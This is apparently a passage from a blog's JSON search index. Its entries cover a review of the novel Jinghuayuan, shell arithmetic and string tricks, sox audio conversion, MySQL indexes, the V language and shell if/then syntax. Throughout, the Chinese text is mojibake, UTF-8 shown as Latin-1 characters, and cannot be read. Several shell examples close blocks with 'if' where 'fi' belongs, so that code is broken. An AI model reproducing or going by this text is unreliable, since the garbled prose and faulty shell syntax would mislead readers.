è¶£ï¼Œç•¥è¿‡ä¸æã€‚\nå•è®²å°è¯´çš„å‰åŠéƒ¨åˆ†ï¼Œå°è¯´å‘ç”Ÿåœ¨å”ä»£ï¼Œä¸»è§’å«åšå”æ•–ï¼Œæœ¬æ¥ç§‘ä¸¾ä¸­äº†æ¢èŠ±ï¼Œä½†æ˜¯å› ä¸ºä»–å’Œè®¨ä¼æ­¦åˆ™å¤©çš„å¾æ•¬ä¸šæœ‰ç»“æ‹œä¹‹äº¤ï¼Œè¢«äººå‘Šå‘ï¼Œé‚é©å»äº†æ¢èŠ±ï¼Œé™ä¸ºç§€æ‰ã€‚\nå”æ•–å¿ƒç°æ„å†·ï¼Œç…®ç†Ÿçš„é¸­å­å°±è¿™ä¹ˆé£äº†ã€‚äºæ˜¯å†³å®šèˆå¼ƒåŠŸåï¼Œæ¸¸å†å±±æ°´ã€‚æ­£å¥½ä»–çš„å¦¹å¤«ï¼Œæ—ä¹‹æ´‹æ˜¯ä¸ªè·‘è¿œæ´‹è´¸æ˜“çš„ã€‚\nå”æ•–æ­£å¥½æ­ä¸Šäº†å¦¹å¤«çš„é¡ºé£èˆ¹ï¼Œç¯æ¸¸ä¸–ç•Œä¹‹æ—…å°±è¿™ä¹ˆå¼€å§‹äº†ï¼ï¼\n1. å›å­å›½ å›å­å›½è®²ç©¶å¥½è®©ä¸æ­£ï¼ŒæƒŸå–„ä¸ºå®ã€‚è¯´çš„æ˜¯è¿™ä¸ªå›½å®¶çš„äººå•Šï¼Œç´ è´¨éå¸¸é«˜ï¼Œé«˜åˆ°ä»€ä¹ˆåœ°æ­¥å‘¢ï¼Ÿé«˜åˆ°æœ‰ç‚¹åäººç±»ã€‚\nä¸‹é¢çš„ä¸€ä¸ªåœºæ™¯ï¼Œæ˜¯æˆ‘ä»å°è¯´ä¸­ç®€åŒ–çš„ä¸€ä¸ªåœºæ™¯ï¼š\nä¹°å®¶è¯´ï¼šè€æ¿ï¼Œä½ çš„ä¸œè¥¿è´¨é‡çœŸå¥½ï¼Œä»·æ ¼å´é‚£ä¹ˆä½ï¼Œå¦‚æœæˆ‘ä¹°äº†å»ï¼Œæˆ‘å†…å¿ƒä¼šä¸å®‰çš„ã€‚è·ªæ±‚ä½ æŠ¬é«˜äº›ä»·æ ¼ï¼Œæˆ‘æ‰ä¹°ï¼Œä¸ç„¶æˆ‘å°±ä¸ä¹°äº†ã€‚\nåº—é“ºè€æ¿è¯´ï¼šæˆ‘è¦çš„ä»·æ ¼è¿™ä¹ˆé«˜ï¼Œå·²ç»è§‰å¾—è¿‡æ„ä¸å»äº†ï¼Œå¦‚æœä½ è¿˜è®©æˆ‘æ¶¨ä»·ï¼Œè¿˜ä½ è¿˜æ˜¯å»åˆ«çš„åœ°æ–¹ä¹°ä¸œè¥¿å§ã€‚\nä¹°å®¶è¯´ï¼šæ—¢ç„¶ä½ ä¸æ„¿æ„æ¶¨ä»·ï¼Œé‚£ä¹Ÿè¡Œï¼Œæˆ‘è¿˜æŒ‰ç…§è¿™ä¸ªä»·æ ¼ä¹°ä½ çš„ä¸œè¥¿ï¼Œä½†æ˜¯æˆ‘åªæ‹¿ä¸€åŠä¸œè¥¿èµ°ã€‚\næ˜¯ä¸æ˜¯å¾ˆåäººç±»ï¼Œä»æ¥åªè§è¿‡ä¹°å®¶æƒ³è¦å‹ä½ä»·æ ¼çš„ï¼Œè¿˜æœªå¬è¯´è¿‡ä¹°å®¶æƒ³æŠ¬é«˜ä»·æ ¼çš„ã€‚\n2. å¤§äººå›½ æ­¤å¤„çš„å¤§äººå›½ï¼Œå¹¶ä¸æ˜¯è¯´ä»–ä»¬çš„èº«æå·¨å¤§ï¼Œè€Œæ˜¯å½¢å®¹ä»–ä»¬å›½äººçš„å“æ ¼é«˜å¤§ã€‚ä»–ä»¬éƒ½æ˜¯äº‰ç›¸åšå–„äº‹ï¼Œä¸ä½œæ¶äº‹ã€‚\né™¤æ­¤ä»¥å¤–ï¼Œåœ¨ä»–ä»¬çš„å›½å®¶ï¼Œå¾ˆå®¹æ˜“åŒºåˆ†å¥½äººå’Œåäººã€‚ä»–ä»¬æ‰€æœ‰çš„äººè„šä¸‹éƒ½è¸©ç€äº‘ã€‚å…‰æ˜æ­£å¤§çš„äººï¼Œè„šä¸‹æ˜¯å½©äº‘ï¼›ç»å¸¸åšåäº‹çš„äººï¼Œè„šä¸‹æ˜¯é»‘äº‘ã€‚\näº‘çš„è‰²å½©ä¼šéšç€äººçš„å“è¡Œè€Œå˜åŒ–ï¼Œåäººå¦‚æœèƒ½å¤Ÿå‘å–„ï¼Œè¶³ä¸‹ä¹Ÿä¼šäº§ç”Ÿå½©äº‘ã€‚\næœ‰äº›å¤§å®˜äººï¼Œä¸å¸Œæœ›åˆ«äººçœ‹åˆ°ä»–ä»¬è„šä¸‹äº‘çš„é¢œè‰²ï¼Œæ‰€ä»¥ä¼šç”¨å¸ƒè£¹ä¸Šï¼Œä½†æ˜¯è¿™æ ·åšå²‚ä¸æ˜¯æ©è€³ç›—é“ƒå—ï¼Ÿ\n3. é»‘é½¿å›½ è¿™ä¸ªå›½å®¶çš„äººå…¨èº«é€šé»‘ï¼Œè¿ç‰™é½¿éƒ½æ˜¯é»‘çš„ã€‚æˆ‘æ€€ç–‘ä½œè€…æ˜¯ä¸æ˜¯å»è¿‡éæ´²ï¼Œä½†æ˜¯éæ´²äººçš„ç‰™é½¿å¾€å¾€éƒ½æ˜¯ç™½è‰²çš„ã€‚\nä½†æ˜¯äººä¸å¯è²Œç›¸ï¼Œé»‘é½¿å›½çš„äººéå¸¸å–œæ¬¢è¯»ä¹¦ï¼Œä¸ªä¸ªéƒ½æ˜¯æ»¡è…¹ç»çº¶ã€‚è€Œä¸”è¿™ä¸ªåœ°æ–¹çš„å°å·ï¼Œåªä¼šå·ä¹¦ï¼Œå´ä¸å·é‡‘é“¶å®ç‰©ã€‚\n4. åŠ³æ°‘å›½ è¯¥å›½çš„äººä¹Ÿæ˜¯é¢è‰²å¢¨é»‘ï¼Œèµ°è·¯éƒ½æ˜¯æ‘‡æ‘‡æ™ƒæ™ƒï¼Œç»ˆæ—¥å¿™å¿™ç¢Œç¢Œã€‚ä½†æ˜¯å‘¢ï¼Œè¿™ä¸ªå›½å®¶çš„äººæ¯ä¸ªéƒ½æ˜¯é•¿å¯¿ã€‚\n5. è‚è€³å›½ è‚è€³å›½çš„è€³æœµå¾ˆé•¿ï¼Œé•¿è€³åŠè…°ï¼Œèµ°è·¯éƒ½éœ€è¦ç”¨æ‰‹å»æ§ç€è€³æœµã€‚æ›´æœ‰ç”šè€…ï¼Œè€³æœµåŠåœ°ã€‚\né™¤äº†è€³æœµé•¿çš„è¿™ä¸ªç‰¹ç‚¹ä¹‹å¤–ï¼Œæœ‰çš„äººè€³æœµä¹Ÿç‰¹åˆ«å¤§ã€‚æ®è¯´å¯ä»¥ä¸€ä¸ªè€³æœµå½“åºŠå«ï¼Œä¸€ä¸ªè€³æœµå½“æ£‰è¢«ï¼Œç¡åœ¨è‡ªå·±çš„è€³æœµé‡Œã€‚\n6. æ— è‚ å›½ è¿™ä¸ªå›½å®¶çš„äººéƒ½æ²¡æœ‰è‚ å­ï¼Œæ— è®ºåƒå–ä»€ä¹ˆä¸œè¥¿ï¼Œéƒ½ä¼šç«‹å³æ’å‡ºä½“å¤–ã€‚æ‰€ä»¥ä»–ä»¬åœ¨åƒé¥­ä¹‹å‰ï¼Œéƒ½å…ˆæ‰¾å¥½å•æ‰€ï¼Œä¸ç„¶å°±å˜æˆéšåœ°å¤§å°ä¾¿äº†ã€‚\næ›´ä¸ºæ¶å¿ƒçš„æ˜¯ï¼Œå› ä¸ºä»–ä»¬åƒçš„å¿«ä¹Ÿæ‹‰çš„å¿«ï¼Œå¾ˆå¤šé£Ÿç‰©éƒ½æ²¡æœ‰æ¶ˆåŒ–å®Œå…¨ã€‚æ‰€ä»¥æœ‰äº›äººå°±æŠŠæ‹‰å‡ºæ¥çš„ä¾¿ä¾¿æ”¶é›†èµ·æ¥ï¼Œå†ç»™å…¶ä»–äººåƒã€‚\n7. é¬¼å›½ å›½äººå¤œæ™šä¸ç¡è§‰ï¼Œé¢ å€’ç™½å¤©é»‘å¤œï¼Œè¡Œä¸ºä¼¼é¬¼ã€‚\n8. æ¯›æ°‘å›½ å›½äººä¸€èº«é•¿æ¯›ï¼Œæ®è¯´æ˜¯ä¸Šä¸€ä¸–å¤ªä¸ºåå•¬ï¼Œä¸€æ¯›ä¸æ‹”ã€‚æ‰€ä»¥é˜ç‹è®©ä»–ä¸‹ä¸€ä¸–å‡ºç”Ÿåœ¨æ¯›æ°‘å›½ï¼Œè®©ä»–ä»¬æ»¡èº«é•¿æ»¡æ¯›ã€‚\n9. æ— ç»§å›½ å›½äººä»ä¸ç”Ÿè‚²ï¼Œä¹Ÿæ²¡æœ‰å­©å­ã€‚è€Œä¸”ä»–ä»¬ä¹Ÿä¸åŒºåˆ†ç”·å¥³ã€‚\nä¹‹æ‰€ä»¥ä»–ä»¬å›½å®¶çš„äººå£æ²¡æœ‰å‡å°‘ï¼Œæ˜¯å› ä¸ºäººæ­»å120å¹´ä¹‹åè¿˜ä¼šå†æ¬¡å¤æ´»ã€‚\næ‰€ä»¥ä»–ä»¬éƒ½æ˜¯æ­»äº†åˆæ´»ï¼Œæ´»äº†æœ‰æ­»ã€‚\n10. æ·±ç›®å›½ ä»–ä»¬è„¸ä¸Šæ²¡æœ‰çœ¼ç›ï¼Œä»–ä»¬çš„ä¸¤ä¸ªçœ¼ç›éƒ½é•¿åœ¨è‡ªå·±çš„æ‰‹æŒé‡Œã€‚æ˜¯ä¸æ˜¯è§‰å¾—ä¼¼æ›¾ç›¸è¯†å‘¢ï¼Ÿç«å½±é‡Œé¢çš„æˆ‘çˆ±ç½—ã€‚","title":"å¸¦ä½ é¢†ç•¥é•œèŠ±ç¼˜ä¸­çš„ç¥å¥‡å›½åº¦"},{"content":"ä¸»è¦çš„æ•°æ®è¿ç®—æ–¹å¼\nlet (()) [] expr bc ä½¿ç”¨ let ä½¿ç”¨ let æ—¶ï¼Œç­‰å·å³è¾¹çš„å˜é‡ä¸éœ€è¦åœ¨åŠ ä¸Š$ç¬¦å·\n#!/bin/bash no1=1; no2=2; # æ³¨æ„ä¸¤ä¸ªå˜é‡çš„å€¼çš„ç±»å‹å®é™…ä¸Šæ˜¯å­—ç¬¦ä¸² re1=$no1+$no2 # æ³¨æ„æ­¤æ—¶re1çš„å€¼æ˜¯1+2 let result=no1+no2 # æ­¤æ—¶æ‰æ˜¯æƒ³è·å–çš„ä¸¤æ•°å­—çš„å’Œï¼Œ3 ","permalink":"https://wdd.js.org/shell/match-eval/","summary":"ä¸»è¦çš„æ•°æ®è¿ç®—æ–¹å¼\nlet (()) [] expr bc ä½¿ç”¨ let ä½¿ç”¨ let æ—¶ï¼Œç­‰å·å³è¾¹çš„å˜é‡ä¸éœ€è¦åœ¨åŠ ä¸Š$ç¬¦å·\n#!/bin/bash no1=1; no2=2; # æ³¨æ„ä¸¤ä¸ªå˜é‡çš„å€¼çš„ç±»å‹å®é™…ä¸Šæ˜¯å­—ç¬¦ä¸² re1=$no1+$no2 # æ³¨æ„æ­¤æ—¶re1çš„å€¼æ˜¯1+2 let result=no1+no2 # æ­¤æ—¶æ‰æ˜¯æƒ³è·å–çš„ä¸¤æ•°å­—çš„å’Œï¼Œ3 ","title":"shellæ•°å­¦è¿ç®—"},{"content":"è·å–å­—ç¬¦ä¸²é•¿åº¦ éœ€è¦åœ¨å˜é‡å‰åŠ ä¸ª**#**\nname=wdd echo ${#name} é¦–å°¾å»ç©ºæ ¼ echo \u0026#34; abcd \u0026#34; | xargs å­—ç¬¦ä¸²åŒ…å« # $varæ˜¯å¦åŒ…å«å­—ç¬¦ä¸²A if [[ $var =~ \u0026#34;A\u0026#34; ]]; then echo fi # $varæ˜¯å¦ä»¥å­—ç¬¦ä¸²Aå¼€å¤´ if [[ $var =~ \u0026#34;^A\u0026#34; ]]; then echo fi # $varæ˜¯å¦ä»¥å­—ç¬¦ä¸²Aç»“å°¾ if [[ $var =~ \u0026#34;A$\u0026#34; ]]; then echo fi å­—ç¬¦ä¸²æå– #!/bin/bash num1=${test#*_} num2=${num1#*_} surname=${num2%_*} num4=${test##*_} profession=${num4%.*} #*_ ä»å·¦è¾¹å¼€å§‹ï¼Œå»ç¬¬ä¸€ä¸ªç¬¦å·â€œ_â€å·¦è¾¹çš„æ‰€æœ‰å­—ç¬¦ % _* ä»å³è¾¹å¼€å§‹ï¼Œå»æ‰ç¬¬ä¸€ä¸ªç¬¦å·â€œ_â€å³è¾¹çš„æ‰€æœ‰å­—ç¬¦ ##*_ ä»å³è¾¹å¼€å§‹ï¼Œå»æ‰ç¬¬ä¸€ä¸ªç¬¦å·â€œ_â€å·¦è¾¹çš„æ‰€æœ‰å­—ç¬¦ %%_* ä»å·¦è¾¹å¼€å§‹ï¼Œå»æ‰ç¬¬ä¸€ä¸ªç¬¦å·â€œ_â€å³è¾¹çš„æ‰€æœ‰å­—ç¬¦ åˆ¤æ–­æŸä¸ªå­—ç¬¦ä¸²æ˜¯å¦ä»¥ç‰¹å®šå­—ç¬¦å¼€å¤´ if [[ $TAG =~ ABC* ]]; then echo $TAG is begin with ABC fi ","permalink":"https://wdd.js.org/shell/string-operator/","summary":"è·å–å­—ç¬¦ä¸²é•¿åº¦ éœ€è¦åœ¨å˜é‡å‰åŠ ä¸ª**#**\nname=wdd echo ${#name} é¦–å°¾å»ç©ºæ ¼ echo \u0026#34; abcd \u0026#34; | xargs å­—ç¬¦ä¸²åŒ…å« # $varæ˜¯å¦åŒ…å«å­—ç¬¦ä¸²A if [[ $var =~ \u0026#34;A\u0026#34; ]]; then echo fi # $varæ˜¯å¦ä»¥å­—ç¬¦ä¸²Aå¼€å¤´ if [[ $var =~ \u0026#34;^A\u0026#34; ]]; then echo fi # $varæ˜¯å¦ä»¥å­—ç¬¦ä¸²Aç»“å°¾ if [[ $var =~ \u0026#34;A$\u0026#34; ]]; then echo fi å­—ç¬¦ä¸²æå– #!/bin/bash num1=${test#*_} num2=${num1#*_} surname=${num2%_*} num4=${test##*_} profession=${num4%.*} #*_ ä»å·¦è¾¹å¼€å§‹ï¼Œå»ç¬¬ä¸€ä¸ªç¬¦å·â€œ_â€å·¦è¾¹çš„æ‰€æœ‰å­—ç¬¦ % _* ä»å³è¾¹å¼€å§‹ï¼Œå»æ‰ç¬¬ä¸€ä¸ªç¬¦å·â€œ_â€å³è¾¹çš„æ‰€æœ‰å­—ç¬¦ ##*_ ä»å³è¾¹å¼€å§‹ï¼Œå»æ‰ç¬¬ä¸€ä¸ªç¬¦å·â€œ_â€å·¦è¾¹çš„æ‰€æœ‰å­—ç¬¦ %%_* ä»å·¦è¾¹å¼€å§‹ï¼Œå»æ‰ç¬¬ä¸€ä¸ªç¬¦å·â€œ_â€å³è¾¹çš„æ‰€æœ‰å­—ç¬¦ åˆ¤æ–­æŸä¸ªå­—ç¬¦ä¸²æ˜¯å¦ä»¥ç‰¹å®šå­—ç¬¦å¼€å¤´ if [[ $TAG =~ ABC* ]]; then echo $TAG is begin with ABC fi ","title":"å­—ç¬¦ä¸²æ“ä½œ"},{"content":"abå®‰è£… apt-get install apache2-utils ","permalink":"https://wdd.js.org/posts/2019/10/pbv6ok/","summary":"abå®‰è£… apt-get install apache2-utils ","title":"æ¥å£å‹åŠ›æµ‹è¯•"},{"content":"apt-get install sox libsox-fmt-mp3 -y sox input.vox output.mp3 soxæ”¯æŒå‘½ä»¤ âœ vox sox --help sox: SoX v14.4.1 Usage summary: [gopts] [[fopts] infile]... [fopts] outfile [effect [effopt]]... SPECIAL FILENAMES (infile, outfile): - Pipe/redirect input/output (stdin/stdout); may need -t -d, --default-device Use the default audio device (where available) -n, --null Use the `null\u0026#39; file handler; e.g. with synth effect -p, --sox-pipe Alias for `-t sox -\u0026#39; SPECIAL FILENAMES (infile only): \u0026#34;|program [options] ...\u0026#34; Pipe input from external program (where supported) http://server/file Use the given URL as input file (where supported) GLOBAL OPTIONS (gopts) (can be specified at any point before the first effect): --buffer BYTES Set the size of all processing buffers (default 8192) --clobber Don\u0026#39;t prompt to overwrite output file (default) --combine concatenate Concatenate all input files (default for sox, rec) --combine sequence Sequence all input files (default for play) -D, --no-dither Don\u0026#39;t dither automatically --effects-file FILENAME File containing effects and options -G, --guard Use temporary files to guard against clipping -h, --help Display version number and usage information --help-effect NAME Show usage of effect NAME, or NAME=all for all --help-format NAME Show info on format NAME, or NAME=all for all --i, --info Behave as soxi(1) --input-buffer BYTES Override the input buffer size (default: as --buffer) --no-clobber Prompt to overwrite output file -m, --combine mix Mix multiple input files (instead of concatenating) --combine mix-power Mix to equal power (instead of concatenating) -M, --combine merge Merge multiple input files (instead of concatenating) --magic Use `magic\u0026#39; file-type detection --multi-threaded Enable parallel effects channels processing --norm Guard (see --guard) \u0026amp; normalise --play-rate-arg ARG Default `rate\u0026#39; argument for auto-resample with `play\u0026#39; --plot gnuplot|octave Generate script to plot response of filter effect -q, --no-show-progress Run in quiet mode; opposite of -S --replay-gain track|album|off Default: off (sox, rec), track (play) -R Use default random numbers (same on each run of SoX) -S, --show-progress Display progress while processing audio data --single-threaded Disable parallel effects channels processing --temp DIRECTORY Specify the directory to use for temporary files -T, --combine multiply Multiply samples of corresponding channels from all input files (instead of concatenating) --version Display version number of SoX and exit -V[LEVEL] Increment or set verbosity level (default 2); levels: 1: failure messages 2: warnings 3: details of processing 4-6: increasing levels of debug messages FORMAT OPTIONS (fopts): Input file format options need only be supplied for files that are headerless. Output files will have the same format as the input file where possible and not overriden by any of various means including providing output format options. -v|--volume FACTOR Input file volume adjustment factor (real number) --ignore-length Ignore input file length given in header; read to EOF -t|--type FILETYPE File type of audio -e|--encoding ENCODING Set encoding (ENCODING may be one of signed-integer, unsigned-integer, floating-point, mu-law, a-law, ima-adpcm, ms-adpcm, gsm-full-rate) -b|--bits BITS Encoded sample size in bits -N|--reverse-nibbles Encoded nibble-order -X|--reverse-bits Encoded bit-order --endian little|big|swap Encoded byte-order; swap means opposite to default -L/-B/-x Short options for the above -c|--channels CHANNELS Number of channels of audio data; e.g. 2 = stereo -r|--rate RATE Sample rate of audio -C|--compression FACTOR Compression factor for output format --add-comment TEXT Append output file comment --comment TEXT Specify comment text for the output file --comment-file FILENAME File containing comment text for the output file --no-glob Don\u0026#39;t `glob\u0026#39; wildcard match the following filename AUDIO FILE FORMATS: 8svx aif aifc aiff aiffc al amb amr-nb amr-wb anb au avr awb caf cdda cdr cvs cvsd cvu dat dvms f32 f4 f64 f8 fap flac fssd gsm gsrt hcom htk ima ircam la lpc lpc10 lu mat mat4 mat5 maud mp2 mp3 nist ogg paf prc pvf raw s1 s16 s2 s24 s3 s32 s4 s8 sb sd2 sds sf sl sln smp snd sndfile sndr sndt sou sox sph sw txw u1 u16 u2 u24 u3 u32 u4 u8 ub ul uw vms voc vorbis vox w64 wav wavpcm wv wve xa xi PLAYLIST FORMATS: m3u pls AUDIO DEVICE DRIVERS: alsa EFFECTS: allpass band bandpass bandreject bass bend biquad chorus channels compand contrast dcshift deemph delay dither divide+ downsample earwax echo echos equalizer fade fir firfit+ flanger gain highpass hilbert input# ladspa loudness lowpass mcompand mixer* noiseprof noisered norm oops output# overdrive pad phaser pitch rate remix repeat reverb reverse riaa silence sinc spectrogram speed splice stat stats stretch swap synth tempo treble tremolo trim upsample vad vol * Deprecated effect + Experimental effect # LibSoX-only effect EFFECT OPTIONS (effopts): effect dependent; see --help-effect å‚è€ƒ http://sox.sourceforge.net/sox.html#OPTIONS ","permalink":"https://wdd.js.org/posts/2019/10/nw4wmm/","summary":"apt-get install sox libsox-fmt-mp3 -y sox input.vox output.mp3 soxæ”¯æŒå‘½ä»¤ âœ vox sox --help sox: SoX v14.4.1 Usage summary: [gopts] [[fopts] infile]... [fopts] outfile [effect [effopt]]... SPECIAL FILENAMES (infile, outfile): - Pipe/redirect input/output (stdin/stdout); may need -t -d, --default-device Use the default audio device (where available) -n, --null Use the `null\u0026#39; file handler; e.g. with synth effect -p, --sox-pipe Alias for `-t sox -\u0026#39; SPECIAL FILENAMES (infile only): \u0026#34;|program [options] ...\u0026#34; Pipe input from external program (where supported) http://server/file Use the given URL as input file (where supported) GLOBAL OPTIONS (gopts) (can be specified at any point before the first effect): --buffer BYTES Set the size of all processing buffers (default 8192) --clobber Don\u0026#39;t prompt to overwrite output file (default) --combine concatenate Concatenate all input files (default for sox, rec) --combine sequence Sequence all input files (default for play) -D, --no-dither Don\u0026#39;t dither automatically --effects-file FILENAME File containing effects and options -G, --guard Use temporary files to guard against clipping -h, --help Display version number and usage information --help-effect NAME Show usage of effect NAME, or NAME=all for all --help-format NAME Show info on format NAME, or NAME=all for all --i, --info Behave as soxi(1) --input-buffer BYTES Override the input buffer size (default: as --buffer) --no-clobber Prompt to overwrite output file -m, --combine mix Mix multiple input files (instead of concatenating) --combine mix-power Mix to equal power (instead of concatenating) -M, --combine merge Merge multiple input files (instead of concatenating) --magic Use `magic\u0026#39; file-type detection --multi-threaded Enable parallel effects channels processing --norm Guard (see --guard) \u0026amp; normalise --play-rate-arg ARG Default `rate\u0026#39; argument for auto-resample with `play\u0026#39; --plot gnuplot|octave Generate script to plot response of filter effect -q, --no-show-progress Run in quiet mode; opposite of -S --replay-gain track|album|off Default: off (sox, rec), track (play) -R Use default random numbers (same on each run of SoX) -S, --show-progress Display progress while processing audio data --single-threaded Disable parallel effects channels processing --temp DIRECTORY Specify the directory to use for temporary files -T, --combine multiply Multiply samples of corresponding channels from all input files (instead of concatenating) --version Display version number of SoX and exit -V[LEVEL] Increment or set verbosity level (default 2); levels: 1: failure messages 2: warnings 3: details of processing 4-6: increasing levels of debug messages FORMAT OPTIONS (fopts): Input file format options need only be supplied for files that are headerless.","title":"voxè¯­éŸ³è½¬mp3"},{"content":"prdæ˜¯è¡¨åï¼Œagentæ˜¯è¡¨ä¸­çš„ä¸€ä¸ªå­—æ®µï¼Œindex_agentæ˜¯ç´¢å¼•å\ncreate index index_agent on prd(agent) # åˆ›å»ºç´¢å¼• show index from prd # æ˜¾ç¤ºè¡¨ä¸Šæœ‰å“ªäº›ç´¢å¼• drop index index_agent on prd # åˆ é™¤ç´¢å¼• åˆ›å»ºç´¢å¼•çš„å¥½å¤„æ˜¯æŸ¥è¯¢é€Ÿåº¦æœ‰æå¤§çš„ææˆï¼Œåå¤„æ˜¯æ›´æ–°è®°å½•æ—¶ï¼Œæœ‰å¯èƒ½ä¹Ÿä¼šæ›´æ–°ç´¢å¼•ï¼Œä»è€Œé™ä½æ€§èƒ½ã€‚\næ‰€ä»¥ç´¢å¼•æ¯”è¾ƒé€‚åˆé‚£ç§åªå†™å…¥ï¼Œæˆ–è€…æŸ¥è¯¢ï¼Œä½†æ˜¯ä¸€èˆ¬ä¸ä¼šæ›´æ–°çš„æ•°æ®ã€‚\n","permalink":"https://wdd.js.org/posts/2019/10/bs9nax/","summary":"prdæ˜¯è¡¨åï¼Œagentæ˜¯è¡¨ä¸­çš„ä¸€ä¸ªå­—æ®µï¼Œindex_agentæ˜¯ç´¢å¼•å\ncreate index index_agent on prd(agent) # åˆ›å»ºç´¢å¼• show index from prd # æ˜¾ç¤ºè¡¨ä¸Šæœ‰å“ªäº›ç´¢å¼• drop index index_agent on prd # åˆ é™¤ç´¢å¼• åˆ›å»ºç´¢å¼•çš„å¥½å¤„æ˜¯æŸ¥è¯¢é€Ÿåº¦æœ‰æå¤§çš„ææˆï¼Œåå¤„æ˜¯æ›´æ–°è®°å½•æ—¶ï¼Œæœ‰å¯èƒ½ä¹Ÿä¼šæ›´æ–°ç´¢å¼•ï¼Œä»è€Œé™ä½æ€§èƒ½ã€‚\næ‰€ä»¥ç´¢å¼•æ¯”è¾ƒé€‚åˆé‚£ç§åªå†™å…¥ï¼Œæˆ–è€…æŸ¥è¯¢ï¼Œä½†æ˜¯ä¸€èˆ¬ä¸ä¼šæ›´æ–°çš„æ•°æ®ã€‚","title":"MySqlç´¢å¼•"},{"content":"ä»Šå¤©é€›github trending, å‘ç°æ¦œé¦–æœ‰ä¸ªé¡¹ç›®ï¼Œå«åšvè¯­è¨€ã€‚https://github.com/vlang/v\nçœ‹äº†ä»‹ç»ï¼Œè¯´è¿™ä¸ªè¯­è¨€éå¸¸ç‰›Xï¼Œå‡ ä¹å›Šæ‹¬äº†æ‰€æœ‰è¯­è¨€çš„é•¿å¤„ã€‚æ€§èƒ½ã€ç¼–è¯‘è€—æ—¶ã€å†…å­˜ä½¿ç”¨éƒ½æ˜¯ç¢¾å‹å…¶ä»–è¯­è¨€ã€‚\nä½†æ˜¯ï¼Œè¦è®°ä½å¼ æ— å¿Œå¨˜è¯´è¿‡çš„ä¸€å¥è¯ï¼šè¶Šæ˜¯æ¼‚äº®çš„å¥³äººï¼Œè¶Šä¼šéª—äººã€‚\næ¯ä¸€é—¨è¯­è¨€éƒ½æ˜¯ç”±ç‰¹å®šçš„ä½¿ç”¨åœºæ™¯ï¼Œä»è€Œåˆ™å†³å®šäº†è¯¥è¯­è¨€åœ¨è¯¥åœºæ™¯ä¸‹è§£å†³é—®é¢˜çš„èƒ½åŠ›ã€‚\nä¸è°ˆä½¿ç”¨åœºæ™¯ï¼Œè€Œä»…ä»…å¼ºè°ƒä¼˜ç‚¹ï¼Œå¾€å¾€æ˜¯è€æµæ°“ã€‚\nä½ çœ‹JavaScriptä¸€å‡ºç”Ÿï¼Œå°±æ˜¯å„ç§é—®é¢˜ï¼Œä½†æ˜¯åœ¨æµè§ˆå™¨é‡Œï¼ŒJavaScriptå°±æ˜¯èƒ½å¤Ÿä¸€ç»Ÿå¤©ä¸‹ï¼Œæ— äººèƒ½å¤Ÿæ©ç›–å…¶é”‹èŠ’ã€‚\n","permalink":"https://wdd.js.org/posts/2019/10/awgyhh/","summary":"ä»Šå¤©é€›github trending, å‘ç°æ¦œé¦–æœ‰ä¸ªé¡¹ç›®ï¼Œå«åšvè¯­è¨€ã€‚https://github.com/vlang/v\nçœ‹äº†ä»‹ç»ï¼Œè¯´è¿™ä¸ªè¯­è¨€éå¸¸ç‰›Xï¼Œå‡ ä¹å›Šæ‹¬äº†æ‰€æœ‰è¯­è¨€çš„é•¿å¤„ã€‚æ€§èƒ½ã€ç¼–è¯‘è€—æ—¶ã€å†…å­˜ä½¿ç”¨éƒ½æ˜¯ç¢¾å‹å…¶ä»–è¯­è¨€ã€‚\nä½†æ˜¯ï¼Œè¦è®°ä½å¼ æ— å¿Œå¨˜è¯´è¿‡çš„ä¸€å¥è¯ï¼šè¶Šæ˜¯æ¼‚äº®çš„å¥³äººï¼Œè¶Šä¼šéª—äººã€‚\næ¯ä¸€é—¨è¯­è¨€éƒ½æ˜¯ç”±ç‰¹å®šçš„ä½¿ç”¨åœºæ™¯ï¼Œä»è€Œåˆ™å†³å®šäº†è¯¥è¯­è¨€åœ¨è¯¥åœºæ™¯ä¸‹è§£å†³é—®é¢˜çš„èƒ½åŠ›ã€‚\nä¸è°ˆä½¿ç”¨åœºæ™¯ï¼Œè€Œä»…ä»…å¼ºè°ƒä¼˜ç‚¹ï¼Œå¾€å¾€æ˜¯è€æµæ°“ã€‚\nä½ çœ‹JavaScriptä¸€å‡ºç”Ÿï¼Œå°±æ˜¯å„ç§é—®é¢˜ï¼Œä½†æ˜¯åœ¨æµè§ˆå™¨é‡Œï¼ŒJavaScriptå°±æ˜¯èƒ½å¤Ÿä¸€ç»Ÿå¤©ä¸‹ï¼Œæ— äººèƒ½å¤Ÿæ©ç›–å…¶é”‹èŠ’ã€‚","title":"å…³äºvè¯­è¨€: è¶Šæ˜¯æ¼‚äº®çš„è¯­è¨€ï¼Œè¶Šä¼šéª—äºº"},{"content":"if then // good if [ -d public ] then echo \u0026#34;public exist\u0026#34; if // good if [ -d public ]; then echo \u0026#34;public exist\u0026#34; if // error: ifå’Œthenå†™æˆä¸€è¡Œæ—¶ï¼Œæ¡ä»¶åå¿…é¡»åŠ ä¸Šåˆ†å· if [ -d public ] then echo \u0026#34;public exist\u0026#34; if // error: shellå¯¹ç©ºæ ¼æ¯”è¾ƒæ•æ„Ÿï¼Œå¤šä¸ªç©ºæ ¼å’Œå°‘ä¸ªç©ºæ ¼ï¼Œæ‰§è¡Œçš„å«ä¹‰å®Œå…¨ä¸åŒ // åœ¨[]ä¸­ï¼Œå†…ä¾§å‰åéƒ½éœ€è¦åŠ ä¸Šç©ºæ ¼ if [-d public] then echo \u0026#34;public exist\u0026#34; if if elif then if [ -d public ] then echo \u0026#34;public exist\u0026#34; elif then å¾ªç¯ switch å¸¸ç”¨ä¾‹å­ åˆ¤æ–­ç›®å½•æ˜¯å¦å­˜åœ¨ if [ -d public ] then echo \u0026#34;public exist\u0026#34; if åˆ¤æ–­æ–‡ä»¶æ˜¯å¦å­˜åœ¨ ","permalink":"https://wdd.js.org/shell/flow-control/","summary":"if then // good if [ -d public ] then echo \u0026#34;public exist\u0026#34; if // good if [ -d public ]; then echo \u0026#34;public exist\u0026#34; if // error: ifå’Œthenå†™æˆä¸€è¡Œæ—¶ï¼Œæ¡ä»¶åå¿…é¡»åŠ ä¸Šåˆ†å· if [ -d public ] then echo \u0026#34;public exist\u0026#34; if // error: shellå¯¹ç©ºæ ¼æ¯”è¾ƒæ•æ„Ÿï¼Œå¤šä¸ªç©ºæ ¼å’Œå°‘ä¸ªç©ºæ ¼ï¼Œæ‰§è¡Œçš„å«ä¹‰å®Œå…¨ä¸åŒ // åœ¨[]ä¸­ï¼Œå†…ä¾§å‰åéƒ½éœ€è¦åŠ ä¸Šç©ºæ ¼ if [-d public] then echo \u0026#34;public exist\u0026#34; if 